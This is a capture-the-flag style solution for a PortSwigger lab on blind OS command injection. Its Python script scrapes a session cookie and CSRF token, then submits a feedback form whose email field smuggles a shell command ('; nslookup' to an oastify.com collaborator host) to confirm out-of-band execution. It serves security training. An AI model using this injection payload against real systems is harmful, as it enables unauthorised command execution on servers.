# Lab: Blind OS command injection with out-of-band interaction

link to lab: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from datetime import datetime


res = requests.get(
    'https://0ac5000303c94328c3f8c98b00800017.web-security-academy.net/feedback',
    verify=False,
)
soup = BeautifulSoup(res.text, 'html.parser')
session = res.cookies.get('session')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
print("session: ", session)
print("csrf: ", csrf_token)


cookies = {
    'session': session,
}

data = {
    'csrf': csrf_token,
    'name': 'a',
    'email': 'a@a.a; nslookup dj0o0abu85c8n2t1c8i4katb026tuji8.oastify.com ;',
    'subject': 'a',
    'message': 'a',
}

response = requests.post(
    'https://0ac5000303c94328c3f8c98b00800017.web-security-academy.net/feedback/submit',
    cookies=cookies,
    data=data,
    verify=False,
)
```